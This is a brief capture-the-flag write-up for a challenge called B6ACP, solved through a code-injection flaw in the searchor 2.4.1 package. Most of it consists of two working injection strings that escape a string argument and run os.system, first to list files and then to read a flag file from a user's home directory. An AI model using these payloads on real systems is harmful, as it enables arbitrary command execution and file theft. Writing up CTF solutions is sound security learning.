# B6ACP [100 points] (97 solves)
`searchor/2.4.1` vulnerability.\
Use `'), __import__('os').system('ls ..')#` and select `google` print list of files in the directory, since the flag is stored in home as description stated.
After several searches, use `'), __import__('os').system('cat ../home/hkcertuser/local.txt')#` to get the flag.